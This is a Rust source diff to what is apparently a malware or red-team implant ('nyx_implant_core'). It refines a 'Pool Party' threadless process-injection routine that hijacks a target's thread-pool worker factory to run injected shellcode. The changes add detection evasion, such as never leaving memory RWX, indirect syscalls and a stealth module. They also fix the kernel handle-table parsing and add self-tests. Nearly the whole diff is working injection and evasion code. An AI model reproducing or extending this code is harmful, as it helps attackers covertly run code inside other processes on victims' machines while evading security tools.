@@ -31,10 +31,12 @@
 //!    every `TppWorkerThread`-owned handle into the implant, and probing each
 //!    duplicate with `NtQueryInformationWorkerFactory(WorkerFactoryBasicTimer)`
 //!    — a hit returns the worker factory handle.
-//! 3. Allocate an RWX stub region in the target (`NtAllocateVirtualMemory`,
-//!    indirect) and write a crafted `_TP_DIRECT` (callback = section view) +
+//! 3. Allocate an RW stub region in the target (`NtAllocateVirtualMemory`,
+//!    indirect), write a crafted `_TP_DIRECT` (callback = section view) +
 //!    `_TP_WORK` (direct = the TP_DIRECT) into it
-//!    (`NtWriteVirtualMemory`, indirect).
+//!    (`NtWriteVirtualMemory`, indirect), then protect the stub RX. The
+//!    section view is mapped RX in the target (local writer view is RW).
+//!    Steady-state executable memory is never RWX (0x40).
 //! 4. Enqueue the fake work item with
 //!    `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect, 5-arg).
 //!    The existing worker thread dequeues it and calls
@@ -56,6 +58,27 @@
 //!
 //! On any failure (structure mismatch, no TP worker, section/map failure) the
 //! caller degrades to `module_stomp` (method 2) so the command stays functional.
+//!
+//! ## Hosted Server 2025 (build 26100) — selftest 0x5 vs skip 0x9
+//!
+//! Hosted first-run recorded `nyx_selftest_inject_pool` exit **0x5** (bit0
+//! spawn + bit2 WARN-degrade). That 0x5 is the **selftest bitmask**, not
+//! Win32 `ERROR_ACCESS_DENIED`, though `OpenProcess` GLE=5 is one path into
+//! the same degrade. From code:
+//!
+//! 1. `SYSTEM_HANDLE_INFORMATION_EX` on x64 is `NumberOfHandles` @0x00,
+//!    `Reserved` @0x08, `Handles[]` @**0x10** (Geoff Chappell / phnt). A
+//!    parse that starts Handles at 0x08 yields 0 PID hits →
+//!    `"hijack: target has no worker-factory handle"`.
+//! 2. When `C:\nyx_test\nyx_x64_sleeper.exe` is not deployed, the selftest
+//!    falls back to running `notepad.exe`, which may hold **no** worker-
+//!    factory handle (lazy TP). That is an environment skip, not a pass.
+//! 3. `OpenProcess` GLE=5 (`ERROR_ACCESS_DENIED`) after the sacrificial
+//!    already exited (AppX stub / Session 0) is the same env class.
+//!
+//! `nyx_selftest_inject_pool` sets **bit3** (exit 0x9 with bit0) for (2)/(3)
+//! so the hosted matrix can distinguish skip vs 0x5 WARN-fail. Do not treat
+//! 0x9 as success.
 
 #![cfg(target_os = "windows")]
 
@@ -354,9 +377,28 @@ unsafe fn pool_party_open_target(target_pid: u32) -> Result<*mut c_void, String>
     // handle or null.
     let target_h = unsafe { open_process(access, 0, target_pid) };
     if target_h.is_null() {
-        return Err(String::from("OpenProcess(target) failed"));
+        let mut s = String::from("OpenProcess(target) failed gle=");
+        nyx_implant_core::fmt::push_decimal_u32(&mut s, last_error());
+        return Err(s);
     }
     Ok(target_h)
+}
+
+/// `kernel32!GetLastError`, or 0 if unresolved.
+fn last_error() -> u32 {
+    let addr = match unsafe { resolve::export_addr(b"kernel32.dll", b"GetLastError") } {
+        Some(a) => a,
+        None => return 0,
+    };
+    let gle: unsafe extern "system" fn() -> u32 = unsafe { core::mem::transmute(addr) };
+    unsafe { gle() }
+}
+
+/// True when a pool-party `Err` string is an environment skip (no worker
+/// factory in the probe process, OpenProcess denied/gone), not a product
+/// failure. Consumed by `nyx_selftest_inject_pool` bit3 (exit 0x9).
+pub fn is_env_skip(err: &str) -> bool {
+    err.contains("no worker-factory") || err.contains("OpenProcess(target) failed")
 }
 
 /// NtCreateSection (page-file-backed, RWX view). Returns (section, size).
@@ -364,11 +406,13 @@ unsafe fn pool_party_create_section(
     create_section: NtCreateSectionFn,
     shellcode: &[u8],
 ) -> Result<(*mut c_void, i64), String> {
-    // ---- 2. NtCreateSection (page-file-backed, RWX view) ----
+    // ---- 2. NtCreateSection (page-file-backed). 0x40 is the section MAX
+    // protect so an RX target view is allowed; views themselves are RW local /
+    // RX remote — never RWX as the mapped VAD. ----
     // Section size rounded up to a page (4096).
     let section_size: i64 = ((shellcode.len() + 0xFFF) & !0xFFF) as i64;
     let mut section_h: *mut c_void = core::ptr::null_mut();
-    // PAGE_EXECUTE_READWRITE = 0x40; SEC_COMMIT = 0x8000000.
+    // PAGE_EXECUTE_READWRITE = 0x40 (MAX); SEC_COMMIT = 0x8000000.
     let st = unsafe {
         create_section(
             core::ptr::addr_of_mut!(section_h),
@@ -408,7 +452,7 @@ unsafe fn pool_party_map_local(
             core::ptr::addr_of_mut!(local_size),
             1, // ViewShare
             0,
-            0x40, // PAGE_EXECUTE_READWRITE
+            crate::stealth::payload_alloc_protect(), // PAGE_READWRITE — writer view
         )
     };
     if st < 0 {
@@ -449,7 +493,7 @@ unsafe fn pool_party_map_target(
             core::ptr::addr_of_mut!(target_size),
             1,
             0,
-            0x40,
+            crate::stealth::desired_final_protect(), // PAGE_EXECUTE_READ — never RWX
         )
     };
     if st < 0 {
@@ -507,10 +551,11 @@ pub(crate) unsafe fn section_deliver(target_h: *mut c_void, bytes: &[u8]) -> Res
 ///       target by walking the system handle table and duplicating each
 ///       handle owned by `target_pid`, probing each duplicate with
 ///       `NtQueryInformationWorkerFactory` until one succeeds.
-///   (b) It allocates a small RWX stub region in the target (indirect
-///       syscalls — no direct syscall instruction in implant memory) and
+///   (b) It allocates a small RW stub region in the target (indirect
+///       syscalls — no direct syscall instruction in implant memory),
 ///       writes a crafted `_TP_DIRECT` (callback = `target_base`) + a fake
-///       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it.
+///       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it, then
+///       protects the stub RX.
 ///   (c) It enqueues the work item with
 ///       `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect).
 ///       The target's existing `ntdll!TppWorkerThread` dequeues it on its
@@ -591,9 +636,9 @@ pub unsafe fn threadless_inject(
     let (direct_buf, mut work_buf, direct_offset_in_region, work_offset_in_region, region_size) =
         threadless_build_structs(shellcode_addr);
 
-    // ---- 3. Allocate an RWX stub region in the target (indirect syscall) ----
-    let remote_base = match threadless_alloc_region(rt, target_h, region_size) {
-        Ok(b) => b,
+    // ---- 3. Allocate an RW stub region in the target (indirect syscall) ----
+    let (remote_base, alloc_size) = match threadless_alloc_region(rt, target_h, region_size) {
+        Ok(p) => p,
         Err(e) => {
             unsafe { close_handle(worker_factory_h) };
             return Err(e);
@@ -613,6 +658,12 @@ pub unsafe fn threadless_inject(
         &direct_buf,
         &work_buf,
     ) {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(e);
+    }
+
+    // ---- 5b. RW → RX before enqueue. Fail-closed: never dispatch with RWX. ----
+    if let Err(e) = threadless_protect_rx(rt, target_h, remote_base, alloc_size) {
         unsafe { close_handle(worker_factory_h) };
         return Err(e);
     }
@@ -690,12 +741,13 @@ fn threadless_build_structs(
     )
 }
 
-/// Allocate an RWX stub region in the target via the indirect-syscall wrapper.
+/// Allocate an RW stub region in the target via the indirect-syscall wrapper.
+/// Returns `(base, allocated_size)` so the caller can protect RX after write.
 unsafe fn threadless_alloc_region(
     rt: &nyx_implant_core::syscalls::Runtime,
     target_h: *mut c_void,
     region_size: usize,
-) -> Result<usize, String> {
+) -> Result<(usize, usize), String> {
     let mut remote_base: usize = 0;
     let mut alloc_size: usize = region_size;
     let alloc_status = unsafe {
@@ -706,13 +758,41 @@ unsafe fn threadless_alloc_region(
             &mut remote_base,
             &mut alloc_size,
             0x3000, // MEM_COMMIT | MEM_RESERVE
-            0x40,   // PAGE_EXECUTE_READWRITE
+            crate::stealth::payload_alloc_protect(),
         )
     };
     match alloc_status {
-        Some(s) if s >= 0 => Ok(remote_base),
+        Some(s) if s >= 0 => Ok((remote_base, alloc_size)),
         _ => Err(String::from(
             "threadless: NtAllocateVirtualMemory(struct region) failed",
+        )),
+    }
+}
+
+/// RW → RX on the stub region. Fail-closed (do not enqueue with RWX).
+unsafe fn threadless_protect_rx(
+    rt: &nyx_implant_core::syscalls::Runtime,
+    target_h: *mut c_void,
+    remote_base: usize,
+    alloc_size: usize,
+) -> Result<(), String> {
+    let mut prot_base = remote_base;
+    let mut prot_size = alloc_size;
+    let mut old_prot: u32 = 0;
+    let st = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
+            rt,
+            target_h as usize,
+            &mut prot_base,
+            &mut prot_size,
+            crate::stealth::desired_final_protect(),
+            &mut old_prot,
+        )
+    };
+    match st {
+        Some(s) if s >= 0 => Ok(()),
+        _ => Err(String::from(
+            "threadless: NtProtectVirtualMemory RW→RX failed",
         )),
     }
 }
@@ -1079,10 +1159,11 @@ unsafe fn hijack_probe_handle(
 /// pseudo (`(HANDLE)-1`) handles. Pure parse — nothing is duplicated or probed
 /// here — so it is unit-testable against a synthetic buffer.
 ///
-/// Kernel layout (x64):
+/// Kernel layout (x64, phnt / Geoff Chappell):
 /// ```text
 ///   +0x00 ULONG_PTR NumberOfHandles           (u64)
-///   +0x08 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[NumberOfHandles]
+///   +0x08 ULONG_PTR Reserved                  (u64)
+///   +0x10 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[NumberOfHandles]
 /// ```
 /// Each entry (stride `0x28`):
 /// ```text
@@ -1095,14 +1176,27 @@ unsafe fn hijack_probe_handle(
 ///   +0x20 ULONG     HandleAttributes
 ///   +0x24 ULONG     Reserved
 /// ```
-/// A truncated buffer is a no-op (never panics).
+/// Parses at Handles@0x10 first; if that yields 0 hits, retries the legacy
+/// Handles@0x08 layout (docs that omitted Reserved). A truncated buffer is a
+/// no-op (never panics).
 fn collect_target_handles(
     buf: &[u8],
     target_pid: u32,
     out: &mut nyx_implant_core::heap::Vec<usize>,
 ) {
+    collect_target_handles_at(buf, target_pid, out, 0x10);
+    if out.is_empty() {
+        collect_target_handles_at(buf, target_pid, out, 0x08);
+    }
+}
+
+fn collect_target_handles_at(
+    buf: &[u8],
+    target_pid: u32,
+    out: &mut nyx_implant_core::heap::Vec<usize>,
+    handles_off: usize,
+) {
     const COUNT_OFF: usize = 0x00;
-    const HANDLES_OFF: usize = 0x08; // first entry starts after the u64 count
     const ENTRY_STRIDE: usize = 0x28;
     const ENTRY_HANDLE_OFF: usize = 0x10;
     const ENTRY_PID_OFF: usize = 0x08;
@@ -1111,11 +1205,11 @@ fn collect_target_handles(
         return;
     }
     let count = unsafe { (buf.as_ptr().add(COUNT_OFF) as *const u64).read_unaligned() };
-    let max_entries = (buf.len().saturating_sub(HANDLES_OFF)) / ENTRY_STRIDE;
+    let max_entries = (buf.len().saturating_sub(handles_off)) / ENTRY_STRIDE;
     let count = count.min(max_entries as u64) as usize;
 
     for i in 0..count {
-        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
+        let entry = handles_off + i * ENTRY_STRIDE;
         if entry + ENTRY_STRIDE > buf.len() {
             break;
         }
@@ -1195,12 +1289,11 @@ mod tests {
     }
 
     /// The SYSTEM_HANDLE_INFORMATION_EX parse must read the u64 count at 0x00,
-    /// stride 0x28 entries, UniqueProcessId at +0x08 and HandleValue at +0x10
-    /// (x64 layout). Wrong-offset parsing would return the truncated u32 count
-    /// or garbage handles, so this pins the exact kernel layout.
+    /// skip Reserved at 0x08, start Handles at 0x10, stride 0x28, UniqueProcessId
+    /// at +0x08 and HandleValue at +0x10 (x64 phnt layout).
     #[test]
     fn handle_table_parse_matches_x64_layout() {
-        const HANDLES_OFF: usize = 0x08;
+        const HANDLES_OFF: usize = 0x10;
         const ENTRY_STRIDE: usize = 0x28;
         let mut buf = [0u8; HANDLES_OFF + 3 * ENTRY_STRIDE];
         buf[0..8].copy_from_slice(&3u64.to_le_bytes()); // NumberOfHandles = 3
@@ -1234,6 +1327,39 @@ mod tests {
             &mut tiny,
         );
         assert!(tiny.is_empty());
+    }
+
+    /// A buffer laid out with Handles at 0x08 (legacy docs that omitted
+    /// Reserved) must still yield the target handle via the 0x08 fallback.
+    #[test]
+    fn handle_table_parse_falls_back_to_legacy_off() {
+        const HANDLES_OFF: usize = 0x08;
+        const ENTRY_STRIDE: usize = 0x28;
+        let mut buf = [0u8; HANDLES_OFF + ENTRY_STRIDE];
+        buf[0..8].copy_from_slice(&1u64.to_le_bytes());
+        buf[HANDLES_OFF + 0x08..HANDLES_OFF + 0x10].copy_from_slice(&0xBEEFu64.to_le_bytes());
+        buf[HANDLES_OFF + 0x10..HANDLES_OFF + 0x18].copy_from_slice(&0xF00Du64.to_le_bytes());
+        let mut out = nyx_implant_core::heap::Vec::new();
+        collect_target_handles(&buf, 0xBEEF, &mut out);
+        assert_eq!(out.as_slice(), &[0xF00Dusize]);
+    }
+
+    #[test]
+    fn stub_steady_protect_is_rx_not_rwx() {
+        assert_eq!(crate::stealth::desired_final_protect(), 0x20);
+        assert_eq!(crate::stealth::payload_alloc_protect(), 0x04);
+        assert_ne!(crate::stealth::payload_alloc_protect(), 0x40);
+    }
+
+    #[test]
+    fn env_skip_matches_worker_factory_and_openprocess() {
+        assert!(is_env_skip(
+            "hijack: target has no worker-factory handle (no TP worker?)"
+        ));
+        assert!(is_env_skip("OpenProcess(target) failed gle=5"));
+        assert!(!is_env_skip(
+            "threadless: NtSetInformationWorkerFactory(enqueue) rejected (offset drift?)"
+        ));
     }
 
     /// The target-handle access mask must include PROCESS_VM_WRITE (0x0020) —
